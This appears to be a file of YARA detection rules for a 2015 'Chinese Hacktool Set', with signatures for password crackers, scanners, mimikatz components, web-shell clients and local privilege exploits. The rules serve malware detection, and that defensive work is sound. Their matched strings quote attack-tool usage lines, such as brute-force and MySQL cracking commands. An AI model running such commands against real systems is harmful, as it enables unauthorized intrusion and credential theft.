  "sql1433_SQL": "rule sql1433_SQL {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SQL.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"025e87deadd1c50b1021c26cb67b76b476fafd64\"\n\tstrings:\n\t\t/* WIDE: ProductName 1433 */\n\t\t$s0 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 31 00 34 00 33 00 33 }\n\t\t/* WIDE: ProductVersion 1,4,3,3 */\n\t\t$s1 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 31 00 2C 00 34 00 2C 00 33 00 2C 00 33 }\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 90KB and all of them\n}",
  "CookieTools2": "rule CookieTools2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file CookieTools2.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"cb67797f229fdb92360319e01277e1345305eb82\"\n\tstrings:\n\t\t$s1 = \"www.gxgl.com&www.gxgl.net\" fullword wide\n\t\t$s2 = \"ip.asp?IP=\" fullword ascii\n\t\t$s3 = \"MSIE 5.5;\" fullword ascii\n\t\t$s4 = \"SOFTWARE\\\\Borland\\\\\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 700KB and all of them\n}",
  "cyclotron": "rule cyclotron {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file cyclotron.sys\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5b63473b6dc1e5942bf07c52c31ba28f2702b246\"\n\tstrings:\n\t\t$s1 = \"\\\\Device\\\\IDTProt\" fullword wide\n\t\t$s2 = \"IoDeleteSymbolicLink\" fullword ascii  /* Goodware String - occured 467 times */\n\t\t$s3 = \"\\\\??\\\\slIDTProt\" fullword wide\n\t\t$s4 = \"IoDeleteDevice\" fullword ascii  /* Goodware String - occured 993 times */\n\t\t$s5 = \"IoCreateSymbolicLink\" fullword ascii /* Goodware String - occured 467 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3KB and all of them\n}",
  "xscan_gui": "rule xscan_gui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xscan_gui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a9e900510396192eb2ba4fb7b0ef786513f9b5ab\"\n\tstrings:\n\t\t$s1 = \"%s -mutex %s -host %s -index %d -config \\\"%s\\\"\" fullword ascii\n\t\t$s2 = \"www.target.com\" fullword ascii\n\t\t$s3 = \"%s\\\\scripts\\\\desc\\\\%s.desc\" fullword ascii\n\t\t$s4 = \"%c Active/Maximum host thread: %d/%d, Current/Maximum thread: %d/%d, Time(s): %l\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}",
  "CN_Tools_hscan": "rule CN_Tools_hscan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"17a743e40790985ececf5c66eaad2a1f8c4cffe8\"\n\tstrings:\n\t\t$s1 = \"%s -f hosts.txt -port -ipc -pop -max 300,20 -time 10000\" fullword ascii\n\t\t$s2 = \"%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,20\" fullword ascii\n\t\t$s3 = \"%s -h www.target.com -all\" fullword ascii\n\t\t$s4 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n\t\t$s5 = \".\\\\log\\\\Hscan.log\" fullword ascii\n\t\t$s6 = \"[%s]: Found cisco Enable password: %s !!!\" fullword ascii\n\t\t$s7 = \"%s@ftpscan#FTP Account:  %s/[null]\" fullword ascii\n\t\t$s8 = \".\\\\conf\\\\mysql_pass.dic\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}",
  "GoodToolset_pr": "rule GoodToolset_pr {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f6676daf3292cff59ef15ed109c2d408369e8ac8\"\n\tstrings:\n\t\t$s1 = \"-->Got WMI process Pid: %d \" ascii\n\t\t$s2 = \"-->This exploit gives you a Local System shell \" ascii\n\t\t$s3 = \"wmiprvse.exe\" fullword ascii\n\t\t$s4 = \"Try the first %d time\" fullword ascii\n\t\t$s5 = \"-->Build&&Change By p \" ascii\n\t\t$s6 = \"root\\\\MicrosoftIISv2\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and all of them\n}",
  "hydra_7_4_1_hydra": "rule hydra_7_4_1_hydra {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hydra.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"3411d0380a1c1ebf58a454765f94d4f1dd714b5b\"\n\tstrings:\n\t\t$s1 = \"%d of %d target%s%scompleted, %lu valid password%s found\" fullword ascii\n\t\t$s2 = \"[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD\" fullword ascii\n\t\t$s3 = \"hydra -P pass.txt target cisco-enable  (direct console access)\" fullword ascii\n\t\t$s4 = \"[%d][smb] Host: %s Account: %s Error: PASSWORD EXPIRED\" fullword ascii\n\t\t$s5 = \"[ERROR] SMTP LOGIN AUTH, either this auth is disabled\" fullword ascii\n\t\t$s6 = \"\\\"/login.php:user=^USER^&pass=^PASS^&mid=123:incorrect\\\"\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and 2 of them\n}",
  "CN_Tools_srss_2": "rule CN_Tools_srss_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file srss.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"c418b30d004051bbf1b2d3be426936b95b5fea6f\"\n\tstrings:\n\t\t$x1 = \"used pepack!\" fullword ascii\n\n\t\t$s1 = \"KERNEL32.dll\" fullword ascii\n\t\t$s2 = \"KERNEL32.DLL\" fullword ascii\n\t\t$s3 = \"LoadLibraryA\" fullword ascii\n\t\t$s4 = \"GetProcAddress\" fullword ascii\n\t\t$s5 = \"VirtualProtect\" fullword ascii\n\t\t$s6 = \"VirtualAlloc\" fullword ascii\n\t\t$s7 = \"VirtualFree\" fullword ascii\n\t\t$s8 = \"ExitProcess\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and ( $x1 at 0 ) and filesize < 14KB and all of ($s*)\n}",
  "Dos_NtGod": "rule Dos_NtGod {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NtGod.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"adefd901d6bbd8437116f0170b9c28a76d4a87bf\"\n\tstrings:\n\t\t$s0 = \"\\\\temp\\\\NtGodMode.exe\" ascii\n\t\t$s4 = \"NtGodMode.exe\" fullword ascii\n\t\t$s10 = \"ntgod.bat\" fullword ascii\n\t\t$s19 = \"sfxcmd\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 250KB and all of them\n}",
  "CN_Tools_VNCLink": "rule CN_Tools_VNCLink {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file VNCLink.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"cafb531822cbc0cfebbea864489eebba48081aa1\"\n\tstrings:\n\t\t$s1 = \"C:\\\\temp\\\\vncviewer4.log\" fullword ascii\n\t\t$s2 = \"[BL4CK] Patched by redsand || http://blacksecurity.org\" fullword ascii\n\t\t$s3 = \"fake release extendedVkey 0x%x, keysym 0x%x\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 580KB and 2 of them\n}",
  "tools_NTCmd": "rule tools_NTCmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NTCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a3ae8659b9a673aa346a60844208b371f7c05e3c\"\n\tstrings:\n\t\t$s1 = \"pipecmd \\\\\\\\%s -U:%s -P:\\\"\\\" %s\" fullword ascii\n\t\t$s2 = \"[Usage]:  %s <HostName|IP> <Username> <Password>\" fullword ascii\n\t\t$s3 = \"pipecmd \\\\\\\\%s -U:%s -P:%s %s\" fullword ascii\n\t\t$s4 = \"============By uhhuhy (Feb 18,2003) - http://www.cnhonker.net============\" fullword ascii /* PEStudio Blacklist: os */\n\t\t$s5 = \"=======================NTcmd v0.11 for HScan v1.20=======================\" fullword ascii\n\t\t$s6 = \"NTcmd>\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 80KB and 2 of them\n}",
  "mysql_pwd_crack": "rule mysql_pwd_crack {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file mysql_pwd_crack.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"57d1cb4d404688804a8c3755b464a6e6248d1c73\"\n\tstrings:\n\t\t$s1 = \"mysql_pwd_crack 127.0.0.1 -x 3306 -p root -d userdict.txt\" fullword ascii\n\t\t$s2 = \"Successfully --> username %s password %s \" fullword ascii\n\t\t$s3 = \"zhouzhen@gmail.com http://zhouzhen.eviloctal.org\" fullword ascii\n\t\t$s4 = \"-a automode  automatic crack the mysql password \" fullword ascii\n\t\t$s5 = \"mysql_pwd_crack 127.0.0.1 -x 3306 -a\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 1 of them\n}",
  "CmdShell64": "rule CmdShell64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file CmdShell64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5b92510475d95ae5e7cd6ec4c89852e8af34acf1\"\n\tstrings:\n\t\t$s1 = \"C:\\\\Windows\\\\System32\\\\JAVASYS.EXE\" fullword wide\n\t\t$s2 = \"ServiceCmdShell\" fullword ascii\n\t\t$s3 = \"<!-- If your application is designed to work with Windows 8.1, uncomment the fol\" ascii\n\t\t$s4 = \"ServiceSystemShell\" fullword wide\n\t\t$s5 = \"[Root@CmdShell ~]#\" fullword wide\n\t\t$s6 = \"Hello Man 2015 !\" fullword wide\n\t\t$s7 = \"CmdShell\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 30KB and 4 of them\n}",
  "Ms_Viru_v": "rule Ms_Viru_v {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file v.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ecf4ba6d1344f2f3114d52859addee8b0770ed0d\"\n\tstrings:\n\t\t$s1 = \"c:\\\\windows\\\\system32\\\\command.com /c \" fullword ascii\n\t\t$s2 = \"Easy Usage Version -- Edited By: racle@tian6.com\" fullword ascii\n\t\t$s3 = \"OH,Sry.Too long command.\" fullword ascii\n\t\t$s4 = \"Success! Commander.\" fullword ascii\n\t\t$s5 = \"Hey,how can racle work without ur command ?\" fullword ascii\n\t\t$s6 = \"The exploit thread was unable to map the virtual 8086 address space\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 3 of them\n}",
  "CN_Tools_Vscan": "rule CN_Tools_Vscan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Vscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"0365fe05e2de0f327dfaa8cd0d988dbb7b379612\"\n\tstrings:\n\t\t$s1 = \"[+] Usage: VNC_bypauth <target> <scantype> <option>\" fullword ascii\n\t\t$s2 = \"========RealVNC <= 4.1.1 Bypass Authentication Scanner=======\" fullword ascii\n\t\t$s3 = \"[+] Type VNC_bypauth <target>,<scantype> or <option> for more informations\" fullword ascii\n\t\t$s4 = \"VNC_bypauth -i 192.168.0.1,192.168.0.2,192.168.0.3,...\" fullword ascii\n\t\t$s5 = \"-vn:%-15s:%-7d  connection closed\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 60KB and 2 of them\n}",
  "Dos_iis": "rule Dos_iis {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file iis.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"61ffd2cbec5462766c6f1c44bd44eeaed4f3d2c7\"\n\tstrings:\n\t\t$s1 = \"comspec\" fullword ascii\n\t\t$s2 = \"program terming\" fullword ascii\n\t\t$s3 = \"WinSta0\\\\Defau\" fullword ascii\n\t\t$s4 = \"* FROM IIsWebInfo\" ascii\n\t\t$s5 = \"www.icehack.\" ascii\n\t\t$s6 = \"wmiprvse.exe\" fullword ascii\n\t\t$s7 = \"Pid: %d\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 70KB and all of them\n}",
  "IISPutScannesr": "rule IISPutScannesr {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IISPutScannesr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"2dd8fee20df47fd4eed5a354817ce837752f6ae9\"\n\tstrings:\n\t\t$s1 = \"yoda & M.o.D.\" ascii\n\t\t$s2 = \"-> come.to/f2f **************\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and all of them\n}",
  "Generate": "rule Generate {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Generate.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"2cb4c3916271868c30c7b4598da697f59e9c7a12\"\n\tstrings:\n\t\t$s1 = \"C:\\\\TEMP\\\\\" fullword ascii\n\t\t$s2 = \"Connection Closed Gracefully.;Could not bind socket. Address and port are alread\" wide\n\t\t$s3 = \"$530 Please login with USER and PASS.\" fullword ascii\n\t\t$s4 = \"_Shell.exe\" fullword ascii\n\t\t$s5 = \"ftpcWaitingPassword\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2000KB and 3 of them\n}",
  "Pc_rejoice": "rule Pc_rejoice {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file rejoice.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372\"\n\tstrings:\n\t\t$s1 = \"@members.3322.net/dyndns/update?system=dyndns&hostname=\" fullword ascii\n\t\t$s2 = \"http://www.xxx.com/xxx.exe\" fullword ascii\n\t\t$s3 = \"@ddns.oray.com/ph/update?hostname=\" fullword ascii\n\t\t$s4 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n\t\t$s5 = \"ListViewProcessListColumnClick!\" fullword ascii\n\t\t$s6 = \"http://iframe.ip138.com/ic.asp\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3000KB and 3 of them\n}",
  "ms11080_withcmd": "rule ms11080_withcmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms11080_withcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"745e5058acff27b09cfd6169caf6e45097881a49\"\n\tstrings:\n\t\t$s1 = \"Usage : ms11-080.exe cmd.exe Command \" fullword ascii\n\t\t$s2 = \"\\\\ms11080\\\\ms11080\\\\Debug\\\\ms11080.pdb\" fullword ascii\n\t\t$s3 = \"[>] by:Mer4en7y@90sec.org\" fullword ascii\n\t\t$s4 = \"[>] create porcess error\" fullword ascii\n\t\t$s5 = \"[>] ms11-080 Exploit\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and 1 of them\n}",
  "OtherTools_xiaoa": "rule OtherTools_xiaoa {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xiaoa.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"6988acb738e78d582e3614f83993628cf92ae26d\"\n\tstrings:\n\t\t$s1 = \"Usage:system_exp.exe \\\"cmd\\\"\" fullword ascii\n\t\t$s2 = \"The shell \\\"cmd\\\" success!\" fullword ascii\n\t\t$s3 = \"Not Windows NT family OS.\" fullword ascii /* PEStudio Blacklist: os */\n\t\t$s4 = \"Unable to get kernel base address.\" fullword ascii\n\t\t$s5 = \"run \\\"%s\\\" failed,code: %d\" fullword ascii\n\t\t$s6 = \"Windows Kernel Local Privilege Exploit \" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}",
  "unknown2": "rule unknown2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file unknown2.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"32508d75c3d95e045ddc82cb829281a288bd5aa3\"\n\tstrings:\n\t\t$s1 = \"http://md5.com.cn/index.php/md5reverse/index/md/\" fullword wide\n\t\t$s2 = \"http://www.md5decrypter.co.uk/feed/api.aspx?\" fullword wide\n\t\t$s3 = \"http://www.md5.com.cn\" fullword wide\n\t\t$s4 = \"1.5.exe\" fullword wide\n\t\t$s5 = \"\\\\Set.ini\" fullword wide\n\t\t$s6 = \"OpenFileDialog1\" fullword wide\n\t\t$s7 = \" (*.txt)|*.txt\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and 4 of them\n}",
  "hydra_7_3_hydra": "rule hydra_7_3_hydra {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hydra.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"2f82b8bf1159e43427880d70bcd116dc9e8026ad\"\n\tstrings:\n\t\t$s1 = \"[ATTEMPT-ERROR] target %s - login \\\"%s\\\" - pass \\\"%s\\\" - child %d - %lu of %lu\" fullword ascii\n\t\t$s2 = \"(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=))(COMMAND=reload)(PASSWORD=%s)(SERVICE\" ascii\n\t\t$s3 = \"cn=^USER^,cn=users,dc=foo,dc=bar,dc=com for domain foo.bar.com\" fullword ascii\n\t\t$s4 = \"[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD\" fullword ascii\n\t\t$s5 = \"hydra -P pass.txt target cisco-enable  (direct console access)\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 700KB and 1 of them\n}",
  "OracleScan": "rule OracleScan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file OracleScan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"10ff7faf72fe6da8f05526367b3522a2408999ec\"\n\tstrings:\n\t\t$s1 = \"MYBLOG:HTTP://HI.BAIDU.COM/0X24Q\" fullword ascii\n\t\t$s2 = \"\\\\Borland\\\\Delphi\\\\RTL\" fullword ascii\n\t\t$s3 = \"USER_NAME\" ascii\n\t\t$s4 = \"FROMWWHERE\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}",
  "SQLTools": "rule SQLTools {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SQLTools.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"38a9caa2079afa2c8d7327e7762f7ed9a69056f7\"\n\tstrings:\n\t\t$s1 = \"DBN_POST\" fullword wide\n\t\t$s2 = \"LOADER ERROR\" fullword ascii\n\t\t$s3 = \"www.1285.net\" fullword wide\n\t\t$s4 = \"TUPFILEFORM\" fullword wide\n\t\t$s5 = \"DBN_DELETE\" fullword wide\n\t\t$s6 = \"DBINSERT\" fullword wide\n\t\t$s7 = \"Copyright (C) Kibosoft Corp. 2001-2006\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2350KB and all of them\n}",
  "portscanner": "rule portscanner {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file portscanner.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1de367d503fdaaeee30e8ad7c100dd1e320858a4\"\n\tstrings:\n\t\t$s0 = \"PortListfNo\" fullword ascii\n\t\t$s1 = \".533.net\" fullword ascii\n\t\t$s2 = \"CRTDLL.DLL\" fullword ascii\n\t\t$s3 = \"exitfc\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 25KB and all of them\n}",
  "kappfree": "rule kappfree {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file kappfree.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e57e79f190f8a24ca911e6c7e008743480c08553\"\n\tstrings:\n\t\t$s1 = \"Bienvenue dans un processus distant\" fullword wide\n\t\t$s2 = \"kappfree.dll\" fullword ascii\n\t\t$s3 = \"kappfree de mimikatz pour Windows (anti AppLocker)\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and all of them\n}",
  "Smartniff": "rule Smartniff {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Smartniff.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"67609f21d54a57955d8fe6d48bc471f328748d0a\"\n\tstrings:\n\t\t$s1 = \"smsniff.exe\" fullword wide\n\t\t$s2 = \"support@nirsoft.net0\" fullword ascii\n\t\t$s3 = \"</requestedPrivileges></security></trustInfo></assembly>\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and all of them\n}",
  "ChinaChopper_caidao": "rule ChinaChopper_caidao {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file caidao.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"056a60ec1f6a8959bfc43254d97527b003ae5edb\"\n\tstrings:\n\t\t$s1 = \"Pass,Config,n{)\" fullword ascii\n\t\t$s2 = \"phMYSQLZ\" fullword ascii\n\t\t$s3 = \"\\\\DHLP\\\\.\" fullword ascii\n\t\t$s4 = \"\\\\dhlp\\\\.\" fullword ascii\n\t\t$s5 = \"SHAutoComple\" fullword ascii\n\t\t$s6 = \"MainFrame\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1077KB and all of them\n}\n\nrule KiwiTaskmgr_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file KiwiTaskmgr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16\"\n\tstrings:\n\t\t$s1 = \"Process Ok, Memory Ok, resuming process :)\" fullword wide\n\t\t$s2 = \"Kiwi Taskmgr no-gpo\" fullword wide\n\t\t$s3 = \"KiwiAndTaskMgr\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule kappfree_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file kappfree.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5d578df9a71670aa832d1cd63379e6162564fb6b\"\n\tstrings:\n\t\t$s1 = \"kappfree.dll\" fullword ascii\n\t\t$s2 = \"kappfree de mimikatz pour Windows (anti AppLocker)\" fullword wide\n\t\t$s3 = \"' introuvable !\" fullword wide\n\t\t$s4 = \"kiwi\\\\mimikatz\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule x_way2_5_sqlcmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file sqlcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5152a57e3638418b0d97a42db1c0fc2f893a2794\"\n\tstrings:\n\t\t$s1 = \"LOADER ERROR\" fullword ascii\n\t\t$s2 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n\t\t$s3 = \"The ordinal %u could not be located in the dynamic link library %s\" fullword ascii\n\t\t$s4 = \"kernel32.dll\" fullword ascii\n\t\t$s5 = \"VirtualAlloc\" fullword ascii\n\t\t$s6 = \"VirtualFree\" fullword ascii\n\t\t$s7 = \"VirtualProtect\" fullword ascii\n\t\t$s8 = \"ExitProcess\" fullword ascii\n\t\t$s9 = \"user32.dll\" fullword ascii\n\t\t$s16 = \"MessageBoxA\" fullword ascii\n\t\t$s10 = \"wsprintfA\" fullword ascii\n\t\t$s11 = \"kernel32.dll\" fullword ascii\n\t\t$s12 = \"GetProcAddress\" fullword ascii\n\t\t$s13 = \"GetModuleHandleA\" fullword ascii\n\t\t$s14 = \"LoadLibraryA\" fullword ascii\n\t\t$s15 = \"odbc32.dll\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 23KB and filesize > 20KB and all of them\n}\n\nrule Win32_klock {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file klock.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"7addce4434670927c4efaa560524680ba2871d17\"\n\tstrings:\n\t\t$s1 = \"klock.dll\" fullword ascii\n\t\t$s2 = \"Erreur : impossible de basculer le bureau ; SwitchDesktop : \" fullword wide\n\t\t$s3 = \"klock de mimikatz pour Windows\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule ipsearcher {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ipsearcher.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1e96e9c5c56fcbea94d26ce0b3f1548b224a4791\"\n\tstrings:\n\t\t$s0 = \"http://www.wzpg.com\" fullword ascii\n\t\t$s1 = \"ipsearcher\\\\ipsearcher\\\\Release\\\\ipsearcher.pdb\" fullword ascii\n\t\t$s3 = \"_GetAddress\" fullword ascii\n\t\t$s5 = \"ipsearcher.dll\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 140KB and all of them\n}\n\nrule ms10048_x64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms10048-x64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"418bec3493c85e3490e400ecaff5a7760c17a0d0\"\n\tstrings:\n\t\t$s1 = \"The target is most likely patched.\" fullword ascii\n\t\t$s2 = \"Dojibiron by Ronald Huizer, (c) master#h4cker.us  \" fullword ascii\n\t\t$s3 = \"[ ] Creating evil window\" fullword ascii\n\t\t$s4 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 40KB and 1 of them\n}\n\nrule hscangui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscangui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"af8aced0a78e1181f4c307c78402481a589f8d07\"\n\tstrings:\n\t\t$s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n\t\t$s2 = \"http://www.cnhonker.com\" fullword ascii\n\t\t$s3 = \"%s@ftpscan#Cracked account:  